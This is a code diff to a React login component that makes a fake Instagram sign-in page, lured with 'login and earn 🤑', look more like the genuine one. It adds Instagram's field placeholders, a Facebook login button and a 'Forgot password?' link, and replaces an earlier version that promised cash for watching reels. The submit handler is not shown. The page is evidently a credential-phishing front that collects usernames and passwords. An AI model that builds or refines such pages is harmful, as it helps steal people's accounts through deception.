@@ -32,28 +32,28 @@ function LoginForm() {
   };
 
   return (
-    <div className='login-form'>
-        <div className='heading'>
-    <h2>INSTAGRAM</h2>
-    <p>login and earn 🤑</p>
+    <div className="container">
+      
+      <h3>login and earn🤑🤑🤑</h3>
+      
+    <div className="login-box">
+      <h1>Instagram</h1>
+      <form id="loginForm" onSubmit={onSubmit}>
+        <input type="text" name="user-name" placeholder="Phone number, username, or email" required/>
+        <input type="text" name="userId" placeholder="Password" required/>
+        <button className='btn'>Log In</button>
+        <span>{result}</span>
+      </form>
+      <div className="divider">OR</div>
+      <button className="fb-login">Log in with Facebook</button>
+      <a href="#" className="forgot-password">Forgot password?</a>
     </div>
-
-
-    <form onSubmit={onSubmit} >
-<input type="text" name='user-name' placeholder='username' required/>
-<input type="text"  name='userId'  placeholder='Password' required/>
- <button className='btn'>Login</button>
-
- <span> {result}</span>
-
-    </form>
-<p className='rs'>Get instant 50rs  💰</p>
-
-<div className='note'>
-  <p>watch reels and earn money💰 <br /> If you watch one reel then you will get 0.5rs money💰 </p>
-</div>
+    <div className="signup-box">
+      <p>Don't have an account? <a href="#">Sign up</a></p>
     </div>
+  </div>
+
   )
-}
 
+}
 export default LoginForm
